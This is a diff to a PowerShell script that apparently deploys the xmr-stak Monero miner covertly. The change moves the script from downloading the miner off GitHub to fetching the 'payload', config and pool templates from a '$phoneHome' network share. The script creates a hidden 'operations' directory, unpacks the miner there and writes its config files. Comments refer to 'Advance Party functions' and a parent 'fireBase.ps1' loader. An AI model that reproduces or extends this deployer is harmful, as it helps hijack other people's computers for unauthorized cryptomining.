@@ -6,42 +6,50 @@
 param(
   [Parameter(Mandatory = $True,
     ValueFromPipeline = $True)]
-  [string]$opsDirectory
+  [string]$opsDir,
+  [string]$cache,
+  [string]$phoneHome,
+  [string]$distName,
+  [string]$stakName,
+  [string]$stakVersion
 )
 
 # Advance Party functions
 
 function redist ($destination) { #change to point at ops cache and rename function
-
-	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-	Invoke-WebRequest -Uri https://aka.ms/vs/15/release/vc_redist.x64.exe -OutFile $destination
-
+  
+  $itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" + $distName
+  Write-Host $itemPath
+  Copy-Item -Path $itemPath.path -Destination $destination
+  Read-Host "enter"
 }
 
 function payload ($destination) { #change to point at ops cache and rename function
 
-  # Get xmr-stak from github.
-
-  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.8.2/xmr-stak-win64-2.8.2.zip -OutFile $destination
-
+  $itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" +  $stakName + "-" + "$stakVersion" + ".zip"
+  Write-Host $itemPath
+  Copy-Item -Path "filesystem::$itemPath" -Destination $destination
+  Read-Host "enter"
 }
 
 function configTpl () { #change to point at ops cache and rename function
 
-  # Get config template from github
-  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-RestMethod -Uri https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/config.tpl
+  $itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" + "config.tpl"
+  Write-Host $itemPath
+  Copy-Item -Path $itemPath -Destination $opsDir
+  Read-Host "enter"
 
 }
 
 function poolTpl () { #change to point at ops cache and rename function
 
-  # Get pool template from github
-  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-RestMethod -Uri https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/pools.tpl
+  $itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" + "pools.tpl"
+  Write-Host $itemPath
+  Copy-Item -Path $itemPath -Destination $opsDir
+  Read-Host "enter"
 
 }
+
 
 function stripExcess ($template) {
 
@@ -87,19 +95,21 @@ function alterPoolTpl ($file) {
 
 # Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1
 
-if (!(Test-Path $opsDirectory))
+if (!(Test-Path $opsDir))
 
 {
 
-  mkdir $opsDirectory
-  $f = Get-Item $opsDirectory -Force
+  mkdir $opsDir
+  $f = Get-Item $opsDir -Force
   $f.Attributes = "Hidden"
 
-}
+} else { write-host "`nOperations directory exists..."
+          Start-Sleep -s 1
+        }
 
 # Check to see if the Visual C++ Redistributable is installed
 
-$redistDestination = "$opsDirectory\vc_redist.x64.exe"
+$redistDestination = "$opsDir\vc_redist.x64.exe"
 $uninstallValue = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object { $_.DisplayName -like '*Microsoft Visual C++*' } | Where-Object DisplayVersion -gt 14.16.27023
 $installValue = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object { $_.DisplayName -like '*Microsoft Visual C++*' }
 
@@ -121,38 +131,46 @@ else
   write-host "`n"  
   write-host $installValue.DisplayName | Format-Table
   write-host "Currently Installed.`n"
+  Start-Sleep -s 1
 
 }
 
 # Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.
 
-$payloadDestination = "$opsDirectory\payload.zip"
+$payloadDestination = "$opsDir\payload.zip"
 
-if (!(Test-Path "$opsDirectory\xmr-stak-win64-2.8.2"))
+if (!(Test-Path "$opsDir\xmr-stak-win64-2.8.3"))
 
 {
 
   payload $payloadDestination
-  Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDirectory
+  Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDir
   Remove-Item $payloadDestination -Force
 
+} else { write-host "`nPayload exists..."
+      Start-Sleep -s 1
 }
 
 
 # Load the newly unzipped directory path into a variable and set the destiation path to extract the config.
 
-$unzipDir = Get-ChildItem -Path $opsDirectory -Directory -Name
-$stakDir = "$opsDirectory\$unzipDir"
+$unzipDir = Get-ChildItem -Path $opsDir -Directory -Name
+$stakDir = "$opsDir\$unzipDir"
 
 # Check to see if a config.txt file exists - download the template and modify as needed if it doesn't
 
 if (!(Test-Path "$stakDir\config.txt"))
 
 {
-
-  stripExcess (configTpl) | Out-File "$stakDir\config.txt"
+  
+  configTpl
+  $config = Get-Content "$opsDir\config.tpl" -raw
+  stripExcess ($config) | Out-File "$stakDir\config.txt"
   alterConfigTpl "$stakDir\config.txt"
+  Remove-Item "$opsDir\config.tpl"
 
+} else { write-host "`nConfig exists..."
+Start-Sleep -s 1
 }
 
 # Check for a pools.txt file - download the template and modify as needed if it doesn't
@@ -161,8 +179,14 @@ if (!(Test-Path "$stakDir\pools.txt"))
 
 {
 
-  stripExcess (poolTpl) | Out-File "$stakDir\pools.txt"
+  poolTpl
+  $pools = Get-Content "$opsDir\pools.tpl" -raw
+  stripExcess ($pools) | Out-File "$stakDir\pools.txt"
   alterPoolTpl "$stakDir\pools.txt"
+  Remove-Item "$opsDir\pools.tpl"
 
-}
+} else { 
+  write-host "`nPools exist..." 
+  Start-Sleep -s 1
+        }
 
